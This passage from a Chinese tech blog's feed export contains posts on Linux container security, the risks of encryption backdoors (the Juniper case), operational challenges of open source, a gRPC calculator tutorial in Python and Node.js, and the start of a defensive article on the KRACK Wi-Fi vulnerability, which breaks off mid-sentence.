容器操作系统与多租户对于开发人员来说，容器使得他们更容易地构建和升级应用程序，它可以作为一个应用单元的被依赖，通过在共享主机上部署启用多租户应用程序来最大限度地利用服务器资源。容器很容易在单个主机上部署多应用程序，并根据需要开启和关闭单个容器。为了充分利用这种打包和部署技术，运维团队需要正确的运行容器环境。运维人员需要一个操作系统，该系统可以在边界处保护容器，使主机内核与容器隔离并确保容器彼此之间安全。 容器是隔离和约束资源的 Linux 进程，使您能够在共享宿主内核中运行沙盒应用程序。您保护容器的方法应该与确保 Linux 上任何正在运行的进程的安全方法相同。放弃特权是重要的，目前仍然是最佳实践。更好的方法是创建尽可能少的特权容器。容器应该作为普通用户运行，而不是 root 用户。接下来，利用 Linux 中可用的多种级别的安全特性确保容器的安全： Linux 命名空间，安全增强的Linux（SELinux）， cgroups，capabilities 和安全计算模式（seccomp）。 2. 容器内容（使用可信源）当说到安全性的时候，对于容器内容来说意味着什么呢？。一段时间以来，应用程序和基础设施都是由现成的组件组成的。很多都来自于开源软件，例如如 Linux 操作系统，Apache Web 服务器，红帽 JBoss 企业应用平台，PostgreSQL 和 Node.js。基于容器的各种软件包版本现在一应俱全，所以你不需要建立自己。但是，与从外部源下载的任何代码一样，您需要知道包的起源、它们是由谁创建，以及它们内部是否存在恶意代码。 3. 容器注册 (容器镜像加密访问)你的团队构建容器的时候基于下载的公共容器镜像，所以对它的访问管理和更新下载是管理的关键，需以同样的方式管理容器镜像、内建的镜像及其他类型的二进制文件。许多私有仓库注册服务器支持存储容器镜像。选择一个私有的、存储使用的容器镜像自动化策略的注册服务器。 4. 构建过程安全在一个容器化的环境里，软件的构建是整个生命周期的一个阶段，应用程序代码需要与运行库集成。管理此构建过程是确保软件栈安全的关键。坚持“一次构建，到处部署（build once, deploy everywhere）”的理念，确保构建过程的产品正是生产中部署的产品。这一点对于维护容器持续稳定也非常重要，换句话说，不要为运行的容器打补丁；而是应该重新构建、重新部署它们。无论您是在高度规范的行业中工作，还是仅仅想优化团队的工作，需要设计容器镜像的管理和构建过程，以利用容器层实现控制分离，从而使： 运维团队管理基础镜像 架构团队管理中间件、运行时、数据库和其它解决方案 开发团队仅仅专注于应用层和代码 最后，对定制的容器签名，这样可以确保它们在构建和部署环节之间不会被篡改。 5. 控制集群中可部署的内容为了防备在构建过程中发生任何问题，或者在部署一个镜像后发现漏洞，需要增加以自动化的、基于策略的部署的另一层安全性。 让我们看一下构建应用程序的三个容器镜像层：核心层（core）、中间件层（middleware）和应用层（application）。一个问题如果在核心镜像被发现，镜像会重新构建。一旦构建完成，镜像将被推入容器平台注册服务器。平台可以检测到镜像发生了变化。对于依赖于此镜像并有定义触发器的构建，该平台将自动重建应用程序并整合已经修复的库。 一旦构建完成，镜像将被推入容器平台的内部注册服务器。内部注册服务器中镜像的变化能立即检测到，通过应用程序中定义的触发器自动部署更新镜像，确保生产中运行的代码总是与最近更新的镜像相同。所有这些功能协同工作，将安全功能集成到您的持续集成和持续部署（CI / CD）过程中。 6. 容器编排：加强容器平台安全当然，应用程序很少在单个容器中交付。即使是简单的应用程序通常有一个前端，后端和数据库。在容器中部署现代微服务应用，通常意味着多容器部署，有时在同一主机上有时分布在多个主机或节点，如图所示。 当规模化管理容器部署时，您需要考虑： 哪些容器应该部署到哪个主机上？ 哪个主机容量更大？ 哪些容器需要相互访问？他们将如何相互发现？ 如何控制对共享资源的访问和管理，比如网络和存储？ 如何监控容器健康状态？ 如何自动扩展应用能力以满足需求？ 如何使开发者在自助服务的同时满足安全需求？ 考虑到开发人员和运维人员拥有的广泛能力，强大的基于角色的访问控制是容器平台的关键元素。例如，编排管理服务器是访问的中心点，应该得到最高级别的安全检查。API 是大规模自动化容器管理的关键，用于验证和配置容器、服务和复制控制器的数据；对传入的请求执行项目验证；并调用其他主要系统组件上的触发器。 7. 网络隔离在容器部署现代微服务应用程序往往意味着在多个节点分布式部署多个容器。考虑到网络防御，您需要一种在集群中隔离应用程序的方法。 一个典型的公共云服务，例如Google Container Engine (GKE),Azure Container Services, 或者 Amazon Web Services (AWS) Container Service，都是单租户服务。它们允许在您启动的 VM 集群上运行容器。为了实现多租户容器安全，您需要一个容器平台，允许您选择单个集群并将流量分段，以隔离该集群中的不同用户、团队、应用程序和环境。 通过网络命名空间，每个容器集合（称为“POD”）获得自己的IP和端口绑定范围，从而在节点上隔离 POD 网络。 默认情况下，来自不同命名空间（项目）的 POD 不能将包发送到或接收来自不同项目的 POD 、服务的数据包，除了下文所述的选项。您可以使用这些特性来隔离集群中的开发人员、测试和生产环境；然而，IP 地址和端口的这种扩展使得网络变得更加复杂。可以投资一些工具处理这种复杂性。首选的工具是采用软件定义网络（SDN）容器平台，它提供统一的集群网络，保证整个集群的容器之间的通信。 8. 存储对于有状态和无状态的应用程序来说，容器是非常有用的。保护存储是保证有状态服务的关键要素。容器平台应提供多样化的存储插件，包括网络文件系统（NFS），AWS Elastic Block Stores（EBS，弹性块存储），GCE Persistent 磁盘，GlusterFS，iSCSI，RADOS（CEPH）、Cinder 等等。 一个持久卷（PV）可以安装在由资源提供者支持的任何主机。供应商将有不同的能力，每个 PV 的访问模式可以设置为特定卷支持的特定模式。例如，NFS 可以支持多个 读/写的客户端，但一个特定的 NFS PV 可以在服务器上仅作为只读输出。每个 PV 有它自己的一套访问模式，定义特定 PV 的性能指标，例如ReadWriteOnce, ReadOnlyMany, 和 ReadWriteMany。 9. API 管理, 终端安全和单点登录 (SSO)保护应用程序安全包括管理应用程序和 API 身份验证和授权。Web SSO 功能是现代应用程序的关键部分。当开发者构建他们自己的应用时，容器平台可以提供各种容器服务给他们使用。 API 是微服务应用的关键组成部分。微服务应用具有多个独立的 API 服务，这导致服务端点的扩张，因此需要更多的治理工具。推荐使用 API 管理工具。所有 API 平台都应该提供各种 API 认证和安全的标准选项，它们可以单独使用或组合使用，发布证书和控制访问。这些选项包括标准的 API 密钥、应用ID、密钥对和 OAuth 2.0。 10. 角色和访问控制管理（Cluster Federation）2016年7月，Kubernetes 1.3 介绍了 Kubernetes Federated Cluster。这是一个令人兴奋的新功能，目前在 Kubernetes 1.6 beta 。 在公共云或企业数据中心场景中，Federation 对于跨集群部署和访问应用服务是很有用的。多集群使得应用程序的高可用性成为可能，例如多个区域、多个云提供商（如AWS、Google Cloud 和 Azure）实现部署或迁移的通用管理。 在管理集群联邦时，必须确保编排工具在不同的部署平台实例中提供所需的安全性。与以往一样，身份验证和授权是安全的关键 —— 能够安全地将数据传递给应用程序，无论它们在何处运行，在集群中管理应用程序多租户。 Kubernetes 扩展了集群联邦包括支持联邦加密，联邦命名空间和对象入口。 参考文献 10 layers of Linux container security | Daniel Oh | Senior Specialist Solution Architect at Red Hat 扩展阅读网络安全专题合辑《Cyber-Security Manual》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞，争取安全上网 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:事与愿违的后门程序]]></title>
    <url>%2F2017%2F11%2F06%2FCyberSecurity-BackDoor%2F</url>
    <content type="text"><![CDATA[摘要一些情报机构赞同在加密软件中放置后门程序，但是谁使用它们呢？ 原文：Internet security | When back doors backfire |Jan 2nd 2016 如果没有加密技术，互联网上传递的信息倒不如写在明信片上。因此，政府、银行和商业机构都对自己的信息加密，当然恐怖组织和犯罪团伙也是如此。后门的问题就是这样，尽管它能让特工的工作更顺利，但也让互联网的每个人都失去了很多秘密。 近期Juniper公司（一家美国网络硬件和软件供应商）事件的启示，清楚地说明了这点。Juniper在12月紧急发布后门公告，最早可追溯到2012年，它使得任何人可以解读基于VPN软件的加密流量（虚拟私有网络），VPN广泛应用于全球的企业和政府机构，以透过公共互联网链接不同办公区。目前不清楚谁该为此事负责，但是可能是在一个情报机构安装后门程序后，其他人又秘密的修改过。该后门涉及的加密标准包含一个有缺陷的随机数生成算法，它获得了美国国家安全局（NSA）的支持；另外一些线索指向中国或英国的情报机构。 针对不同侦查目标破解加密信息显然是情报结构的职责范围，这也是政府结构应当具备监测能力最好理由，当然是在国家安全利益和法律框架的情况下。为了侦查行动而引入后门程序，风险是可能被胡作非为的特工、敌国政府或者犯罪者滥用，而且是在合法的前提下。目前不清楚Juniper的后门程序是什么人安装、使用，结局是什么。 who behind情报机构辩解称：该后门非常隐秘、足够复杂，他们未经授权使用是不可能的。但是外来者可能偶然发现或者窃取到这个漏洞的细节。特别是美国在安全储存保密数据方面的记录非常糟糕。众所周知，在这个夏天，人事管理办公室发生泄密，包括2000万以上联邦雇员（公务员）的敏感个人数据，据称是中国人干的。有人称这一事件为美国情报史上最大的灾难。唯有Edward Snowden 泄密事件可以与之相比，（斯诺登：前国家安全局承包商雇员，目前居住在莫斯科）。（机场安全当局也不小心泄漏了万能钥匙——能打开大多数商业行李——一种物理上的后门）。 反击后门因此强制性置入后门的观点应当抵制。他们可能被犯罪者利用、从整体上削弱互联网安全，亿万人民赖以进行银行和支付业务。这种行为将损害公众对技术公司的信心，也使西方国家政府对独裁政权干涉互联网的批评更加困难。他们过分的要求在任何情况下都是徒劳的：没有后门的高性能加密软件，任何人在网上都可以免费获得。 与其通过后门程序削弱每个人的秘密，特工应当使用其他手段。 11月巴黎恐怖袭击之所以能成功，不是因为恐怖分子使用了高超的计算机技术，而是因为他们的活动信息没有被有效共享。必要时，国家安全局和其他情报机构通常能用特殊方式在嫌疑人的计算机和手机上植入蠕虫病毒。这比使用一个通用的后门要困难和低效——但是它对别人更安全。 扩展阅读 NSA： National Security Agency隶属美国国防部（DoD），办公地点在五角大楼，主管是现役军官。和CIA工作的最大不同之处在于，后两者首要的工作是面向“人”的间谍活动，而NSA不能参与此类间谍活动它的典型工作比如监视反越战活动，经济间谍活动，遭斯诺登泄露的公众信息是由NSA负责监控的。 a new law just passed in China2015年7月1日，中国全国人大通过了新的《国家安全法》，首次提出“国家建设网络与信息安全保障体系”，“维护国家网络空间主权、安全和发展利益” Juniper 漏洞2015年12月Juniper发布紧急公告，称在对其 NetScreen 产品的内部代码审计过程中发现了两枚漏洞,可以让资深的攻击者获得对 NetScreen 设备的管理权限和解密 VPN 流量。 VPN 虚拟专用网络在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN可通过服务器、硬件、软件等多种方式实现VPN能提供高水平的安全，使用高级的加密和身份识别协议保护数据避免受到窥探，阻止数据窃贼和其他非授权用户接触这种数据。 《The Cyber-Security Master》 Cyber-Security: 黑客与技术、产业及其精神世界 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 2018年第三季度网络安全威胁态势分析与工作综述|工信部宁夏自治区近百万个IP地址发送NTP（Network Time Protocol,网络时间协议）响应信息，疑似被用作DDoS攻击，经宁夏自治区通信管理局组织相关单位研判，确定为宁夏电信公司为家庭宽带用户安装的光调制解调器开启了NTP服务，被攻击者恶意请求后返回的响应信息，宁夏自治区通信管理局督促宁夏电信公司及时对相关用户的近百万台光调制解调器进行远程固件升级，关闭NTP服务，消除被用作发起NTP型DDoS攻击的风险。]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源软件的运营挑战]]></title>
    <url>%2F2017%2F11%2F05%2FOpenSource-Operational%2F</url>
    <content type="text"><![CDATA[摘要 The Big Picture 原文：6 Operational Challenges to Using Open Source Software | By Linux FoundationMarch 15, 2017Blog 在当今迅速发展的市场中，那些速度最快、成本最低的持续创新公司才会赢 。同时，正如你所知，我们正在进行的一系列观察，使用开源软件能够实现快速、低成本的创新。 但它也能引入运营挑战和法律风险。 我们现在已经到了这样一个临界点，开源软件已经成为主流，不使用开源几乎肯定会使你的组织处于劣势。所以你必须学会如何驾驭挑战和风险，才能保持竞争力。 “开源是无处不在的，它是不可避免的……对抗开源的政策是不切实际的，会使你处于竞争劣势。”——加特纳。 在这篇文章中，我们将探讨开源如何成为构建软件现实途径。然后，我们将介绍这种新的软件开发方法为组织引入的挑战。 一、开源软件革命从大约四十年前开始，发端于创新学术研究和GNU工具项目，开源软件已经成为主流并重塑了许多行业。今天，已经有超过150万个独特的开源项目，贡献给软件开发者的工作代码超过百万兆字节。这些资源的可用性、软件模块化的趋势以及软件重用，从根本上改变了大多数公司开发软件的方式。 不久以前，我们大部分软件产品都是自己内部开发的。我们也许会使用了一些第三方组件，用以连接到其他系统或执行一些特殊的业务，但这些都是通过一个精心控制的采购流程控制的。 今天，我们可以利用互联网上免费的开源组件，以更快的速度开发更复杂的软件。我们的大部分活动已经从设计开发定制软件，转变为整合现成的组件或半成品。我们只对应用程序中确实非常独特的部分进行编程。 但是现在，我们不再重复一些精心控制的代码收购，而是从互联网上反复下载代码来进行评估、原型制作和集成。虽然这种方法加快了开发速度，但它制造了一系列新的重大挑战。 二、开源软件六大运营挑战使用开源软件带来了许多好处，但它会在软件开发生命周期中引入风险和额外的操作复杂性。 组织必须处理许多新的软件源代码，包括商业和非商业的供应商 – 一些人使用的开源软件来自数百个不同的来源。 众多可用的开源组件导致需要大量的第三方软件采购决策。这些决策如何做出？许多开发者没有相应的资质考虑所有这些必要的方面，包括软件许可证分析，但是一个沉重复杂的流程，例如陈旧的采购方法，代价昂贵和而且费时很长，以至于无法应用到大量新的采购决策中。 集成了大量的第三方组件会制造复杂性。其中一方面就是在多个相互依赖的代码栈中维护软件版本的一致性。 开源软件项目的范围，覆盖业余玩家到专业的开发和版本测试等不同阶段。您的组织必须确保每个应用程序都能选择相应质量保障级别的组件。 您的组织将如何获得所有这些开源组件的技术支持和更新？健康的开源社区提供优秀的支持和维护，但开源的自助服务模式，需要您的开发者与社区的共同参与这部分工作。 商业合作关系可以通过增加财政奖励的方式，向供应商强化你的诉求主张，但是否能影响开源项目的方向取决于您参与的多方面因素。 ApplicationMicroservice project gizmo Gizmo 是一个集合，集中了可整合的工具、功能以及交互页面来帮助开发者构建 Go 服务，具体来说就是将 API 和 pubsub daemons 集合在一起。这个工具包刚开始的时候是由一小群开发者发起的，目的是为 NYT 构建一个专属邮件平台。 扩展阅读 基于Ganglia实现服务集群性能态势感知 参考文献 6 Operational Challenges to Using Open Source Software | By Linux FoundationMarch 15, 2017Blog 纽约时报开发出基于 Go 语言的微服务工具包 Gizmo In Pursuit of Production Minimalism | 公司里面使用的技术要尽量少。不要引入太多种的编程语言、编程框架、不同类型的数据库等。定期淘汰过时的项目、顺便淘汰掉让人头疼的那些编程语言、框架、软件等。多引入一个新技术，就多了出事故的风险。]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机远程通信协议：gRPC]]></title>
    <url>%2F2017%2F10%2F30%2FProtocol-gRPC%2F</url>
    <content type="text"><![CDATA[摘要 一、远程调用技术简史:从 CORBA 到 gRPC 二、gRPC 简介 三、gRPC 示例代码 远程通信协议：从 CORBA 到 gRPC自从产业界发明机器联网的那一天就已经开始探索最优的远程通信机制。操作系统如 UNIX、Windows 和 Linux 等都有实现远程通信的内部协议，挑战在于如何向开发人员开放一个通信框架。 一、远程调用技术简史在20世纪90年代，当 TCP/IP 协议日臻成熟变成网络通信的黄金标准时，焦点转移到跨平台通信 —— 一台计算机可以通过某种类型网络在另一台计算机上发起一个动作。例如如 CORBA、DCOM、Java RMI 技术，在核心网络基础设施之上创造了一个对开发者友好的抽象层。这些技术还试图发展出一套与开发语言无关的通信框架，这一点对于客户机/服务器体系结构至关重要。 随着本世纪初 Web 技术的演进，HTTP 逐渐演变为事实上的通信标准。HTTP 结合 XML 提供了一种自我描述、不依赖语言、与平台无关的远程通信框架。这种结合的成果是 SOAP 和 WSDL 标准，它们保证了在各种运行环境和平台之间实现互操作的标准化。 下一个冲击互联网的浪潮是 Web 编程。许多开发人员发现定义 SOAP 标准的 HTTP 和 XML 的组合过于严格。这时 JavaScript 和 JSON 开始流行了。Web 2.0 现象（API 发挥了关键作用）, JSON 替代 XML 成为首选的协议。HTTP 和 JSON 这对致命的组合，催生了一个新的非官方标准 REST 。SOAP 要求严格遵守标准和结构定义，仅局限于大型企业应用程序，而 REST 在当代开发人员中很受欢迎。 1.1 HTTP, REST 和微服务归功于 JavaScript 框架，Node.js 以及文档数据库的发展，REST 在 Web 开发者中广受欢迎。许多应用程序开始基于 REST 实现 ，即使是内部序列化和通信模式领域。但 HTTP 是最有效的消息交换协议吗？即使在同一上下文、同一网络，或者是同一台机器上运行的服务之间？HTTP 的便捷性与高性能之间需要作出权衡，这促使我们回到问题的起点，寻找微服务架构中最优的通信框架。 进入 gRPC 时代 —— 来自谷歌，现代的轻量级通信协议。这是一个高性能的、开源的通用远程过程调用（RPC） 框架，它可以在多种开发语言、任何操作系统上运行。 gRPC 在推出的第一年内就被 CoreOS，Netflix，Square 和 Cockroach Labs 等机构采用。 CoreOS 团队的 Etcd，是一种分布式键/值存储服务，采用 gRPC 实现端通信。电信公司如 Cisco，Juniper 和 Arista 都使用 gRPC 实现数据流遥测和网络设备配置。 1.2 什么是 gRPC ?当我第一次遇到 gRPC，它使我想到 CORBA。两个框架都基于语言无关的接口定义语言（IDL） 声明服务，通过特定的语言绑定实现。 CORBA 和 gRPC 二者的设计，都是为了使客户端相信服务器在同一台机器。客户机在桩（Stub）上调用一个方法（method），调用过程由底层协议透明地处理。 gRPC 的秘诀在于处理序列化的方式。gRPC 基于 Protocol Buffer，一个开源的用于结构化数据序列化机制，它是语言和平台无关的。Protocol Buffer 的描述非常详细，与 XML 类似。但是它们比其他的协议格式更小，更快，效率更高。任何需要序列化的自定义数据类型在 gRPC 被定义为一个 Protocol Buffer 。 Protocol Buffer 的最新版本是 proto3，支持多种开发语言的代码生成，Java , C++，Python，Ruby , Java Lite , JavaScript，Objective-C 和 C # 。当一个 Protocol Buffer 编译为一个特定的语言，它的访问器（setter 和 getter）为每个字段提供定义。 相比于 REST + JSON 组合 ，gRPC 提供更好的性能和安全性。它极大的促进了在客户端和服务器之间使用 SSL / TLS 进行身份验证和数据交换加密。 为什么微服务开发者需要使用 gRPC ？gRPC 采用 HTTP / 2 以支持高性能的、可扩展的 API 。报文使用二进制而不是文本通信可以保持载荷紧凑、高效。HTTP / 2 请求在一个 TCP 连接上可支持多路复用，允许多个消息并发传送而不影响网络资源利用率。gRPC 使用报头压缩（header compression ）来减少请求和响应的大小。 二、gRPC 简介2.1 创建 gRPC 服务的流程 在 Protocol Buffer (.proto) 文件中描述服务和载荷结构 从 .proto 文件生成 gRPC 代码 用一种开发语言实现服务端 创建一个客户端调用服务 运行服务端和客户端 Note:Node.js 客户端不需要生成存根（Stub），只要 Protocol Buffer 文件是可访问的，它就可以直接与服务端对话。 三、gRPC 示例代码为了进一步熟悉 gRPC，我们将用 Python 语言创建一个简单的计算服务。它将同时被一个 Python 客户端和一个 Node.js 客户端调用。以下测试示例运行在 Mac OS X 。 你可以从 GitHub 库 https://github.com/grpc/grpc/tree/master/examples 访问源代码，在自己的机器上运行示例。 环境准备 123456789101112131415161718// 配置 Python gRPCpython -m pip install virtualenvvirtualenv venvsource venv/bin/activatepython -m pip install --upgrade pip//安装 gRPC 和 gRPC Toolspython -m pip install grpciopython -m pip install grpcio-tools// 配置 Node.js gRPCnpm install grpc --global//创建目录mkdir Protomkdir Servermkdir -p Client/Pythonmkdir -p Client/Node 创建 Protocol Buffer 文件 12345678910111213141516171819202122232425262728293031323334353637383940//Proto/Calc.protosyntax = "proto3";package calc;service Calculator &#123; rpc Add (AddRequest) returns (AddReply) &#123;&#125; rpc Substract (SubstractRequest) returns (SubstractReply) &#123;&#125; rpc Multiply (MultiplyRequest) returns (MultiplyReply) &#123;&#125; rpc Divide (DivideRequest) returns (DivideReply) &#123;&#125;&#125;message AddRequest&#123; int32 n1=1; int32 n2=2;&#125;message AddReply&#123; int32 n1=1;&#125;message SubstractRequest&#123; int32 n1=1; int32 n2=2;&#125;message SubstractReply&#123; int32 n1=1;&#125;message MultiplyRequest&#123; int32 n1=1; int32 n2=2;&#125;message MultiplyReply&#123; int32 n1=1;&#125;message DivideRequest&#123; int32 n1=1; int32 n2=2;&#125;message DivideReply&#123; float f1=1;&#125; 生成 Python 服务端和客户端代码 1234$ python -m grpc.tools.protoc --python_out=. --grpc_python_out=. --proto_path=. Calc.proto$ cp Calc_pb2.py ../Server$ cp Calc_pb2.py ../Client/Python$ cp Calc.proto ../Client/Node 创建服务端 123456789101112131415161718192021222324252627282930313233343536373839# Server/Calc_Server.pyfrom concurrent import futuresimport timeimport grpcimport Calc_pb2import Calc_pb2_grpc_ONE_DAY_IN_SECONDS = 60 * 60 * 24class Calculator(Calc_pb2.CalculatorServicer): def Add(self, request, context): return Calc_pb2.AddReply(n1=request.n1+request.n2) def Substract(self, request, context): return Calc_pb2.SubstractReply(n1=request.n1-request.n2) def Multiply(self, request, context): return Calc_pb2.MultiplyReply(n1=request.n1*request.n2) def Divide(self, request, context): return Calc_pb2.DivideReply(f1=request.n1/request.n2)def serve(): server = grpc.server(futures.ThreadPoolExecutor(max_workers=10)) Calc_pb2_grpc.add_CalculatorServicer_to_server(Calculator(), server) server.add_insecure_port('[::]:50050') server.start() try: while True: time.sleep(_ONE_DAY_IN_SECONDS) except KeyboardInterrupt: server.stop(0)if __name__ == '__main__': serve() 启动服务端 1python Calc_Server.py 创建 Python 客户端 1234567891011121314151617181920212223# Client/Python/Calc_Client.pyfrom __future__ import print_functionimport grpcimport Calc_pb2import Calc_pb2_grpcdef run(): channel = grpc.insecure_channel('localhost:50050') stub = Calc_pb2_grpc.CalculatorStub(channel) response = stub.Add(Calc_pb2.AddRequest(n1=20,n2=10)) print(response.n1) response = stub.Substract(Calc_pb2.SubstractRequest(n1=20,n2=10)) print(response.n1) response = stub.Multiply(Calc_pb2.MultiplyRequest(n1=20,n2=10)) print(response.n1) response = stub.Divide(Calc_pb2.DivideRequest(n1=20,n2=10)) print(response.f1)if __name__ == '__main__': run() 创建 Node.js 客户端 123456789101112131415161718192021222324252627282930//Client/Node/Calc_Client.jsvar PROTO_PATH = 'Calc.proto';var grpc = require('grpc');var calc_proto = grpc.load(PROTO_PATH).calc;var params=&#123;n1:20, n2:10&#125;;function main() &#123; var client = new calc_proto.Calculator('localhost:50050', grpc.credentials.createInsecure()); client.divide(params, function(err, response) &#123; console.log(response.f1); &#125;); client.multiply(params, function(err, response) &#123; console.log(response.n1); &#125;); client.substract(params, function(err, response) &#123; console.log(response.n1); &#125;); client.add(params, function(err, response) &#123; console.log(response.n1); &#125;);&#125;main(); 启动客户端 Node.js/Python 1234567891011$ python Calc_Client.py30102002.0$ node Calc_Client.js30102002.0 附表：gRPC 年谱 2011 : Protocol Buffers 2 =&gt; language neutral for serializing structured data 2015 : Borg =&gt; Large-scale cluster management =&gt; Kubernetes 2015 : Stubby =&gt; A high performance RPC framework =&gt; gRPC July 2016 : Protocol Buffers 3.0.0 Aug 2016 : gRPC 1.0 ready for production Sept 2016 : Swift-protobuf Jan 2017 : Grpc Swift Apr 2017 : Google Endpoints =&gt; Manage gRPC APIs with Cloud Endpoints Sept 2017 : gRPC 1.6.1 Sept 2017 : Protocol Buffers 3.4.1 Oct 2017 : Swift-protobuf 1.0 Oct 2017 : gRPC 1.7.0 扩展阅读 计算机远程通信协议：从 CORBA 到 gRPC Stack Overflow：2017年最赚钱的编程语言 玩转编程语言:构建自定义代码生成器 基于Kafka构建事件溯源型微服务 LinkedIn 开源 Kafka Monitor 基于Go语言快速构建一个RESTful API服务 应用程序开发中的日志管理(Go语言描述) 参考文献 Google’s gRPC: A Lean and Mean Communication Protocol for Microservices | 9 Sep 2016 7:30am, by Janakiram MSV gRPC microservices are the future ? | Golang Nantes Meetup 21 September 2017 | Cyrille 、Hemidy gRPC：Google开源的基于HTTP/2和ProtoBuf的通用RPC框架 gRPC调用超时控制 How to use etcd service discovery with gRPC in Go? Building High Performance APIs In Go Using gRPC tracing gRPC calls in #Golang with #Google Stackdriver Getting Started with Microservices using Go, gRPC and Kubernetes]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:警惕Wi-Fi漏洞]]></title>
    <url>%2F2017%2F10%2F29%2FCyberSecurity-WiFi%2F</url>
    <content type="text"><![CDATA[摘要 1、不可信任的基础设施：Wi-Fi 2、安全通信协议：HTTPS 3、历史遗留问题：DNS 4、最后一英里的安全：VPN Cyber-Security: 警惕 Wi-Fi 漏洞 KRACK 原文：Tips to Secure Your Network in the Wake of KRACK | KONSTANTIN RYABITSEV OCTOBER 18, 2017 KRACK 攻击将目标放在你的移动设备和 Wi-Fi 接入点之间的链路，它可能是一台路由器 —— 在你的家里、办公室、社区图书馆或者你最喜欢咖啡店。 下面这些技巧能够帮助您提高网络连接的安全性。 密钥重安装攻击 （KRACK, Key Reinstallation Attacks) 概要如下: 基于 WPA2 无线握手协议的漏洞，攻击者可能在你的设备和Wi-Fi接入点之间嗅探或者操纵流量 WPA2 标准存在定义含糊以及标准实现不够严谨，特别是对于 Linux 和 Android 设备来说问题尤其糟糕。事实上，在底层操作系统被修补之前，该漏洞允许攻击者强制所有无线通信流量不进行任何加密。 这个漏洞可以在客户端修补，所以事情并没有到不可收拾的地步。WPA2 无线加密标准并没有过时，WEP （Wired Equivalent Privacy，有线等效保密协议）标准也是同样的道理（解决该问题的方案并不是切换到 WEP ）。 最流行的 Linux 发行版已经在客户机上发送修复此漏洞的更新，所以需要尽快更新。 Android 将很快为这个漏洞推送补丁程序。如果您的设备正在接收 Android 安全补丁，您不久就会收到一个修复程序。如果您的设备不再接收这样的更新，那么这个特殊的漏洞仅仅是您停止使用旧的、不支持更新的 Android 设备的另一个原因。 也就是说，从我的观点来看，Wi-Fi 仅仅是不可信任基础设施链条中的另一个环节，我们应该避免把它当作完全可信的通信渠道。 1、不可信任的基础设施：Wi-Fi如果现在阅读本文是通过你的笔记本电脑或者移动电话，那么你的通信链可能看起来应该是这样的： KRACK 攻击将目标放在你的移动设备和 Wi-Fi 接入点之间的链路，它可能是一台路由器 —— 在你的家里、办公室、社区图书馆或者你最喜欢咖啡店。 实际上，这个图应该类似于这样： Wi-Fi 仅仅是我们漫长的通信链中的第一个不应该信任的环节。如果让我猜的话，你正在使用的 Wi-Fi 路由器可能从开始使用的那天起就没有收到过安全更新。更糟的是，它可能是默认的或容易被猜到的管理凭据（用户名/口令/密钥等），从来就没有更改过。除非你自己初始化并配置了路由器，同时你还能记住自己最后一次是什么时候更新它的固件，总之，你应该假设它现在是由别人控制，不能被信任。 通过 Wi-Fi 路由器，我们进入了一个由各类不可信任基础设施覆盖的区域 — 取决于你的偏执狂水平。在我们的上游有各类 ISP 和服务提供商，他们中的许多人捕获，监视，改变，分析和销售我们的个人流量，试图从我们的浏览习惯中获得更多的钱。通常，他们自己的安全补丁计划留下了许多有待改进的地方，最终使我们的流量暴露在恶意人士的眼里。 通常在互联网上，我们不得不担心强大的、国家级的演员操纵核心网络协议（例如 BGP hijacking，BGP 劫持 ） ，为了支持质量监控程序或者执行国家级的流量过滤能力。 2、安全通信协议：HTTPS幸运的是，我们有一个基于不安全介质进行安全通信的解决方案，我们每天都在使用它 —— HTTPS 协议对我们的 Internet 流量进行点对点加密，并确保我们可以信任我们所通信的站点。 Linux 基金会发起 “Let’s Encrypt” 项目,Let’s Encrypt is a free, automated, and open Certificate Authority.，便于网站所有者全球提供终端到终端的加密，这有助于确保任何受损的设备，我们的个人设备，我们要访问的网站之间没有通信泄密风险。 好吧…只能说尽量接近没有风险。 3、历史遗留问题：DNS即使我们忠实地使用 HTTPS 协议来创建一个可信的通信渠道，攻击者还有一个机会，访问我们的 Wi-Fi 路由器或改变我们的 Wi-Fi 流量 — 例如 KRACK 攻击 — 可以诱导我们同错误的网站通信。他们可以这样做事利用了另一个事实，即我们仍然十分依赖于 DNS —— 一种上世纪80年代开始应用，不加密，非常容易被欺骗协议。 DNS （Domain Name System，域名系统）可以将人类友好的域名例如“linux.com”转换成 IP 地址 —— 计算机可以基于 IP 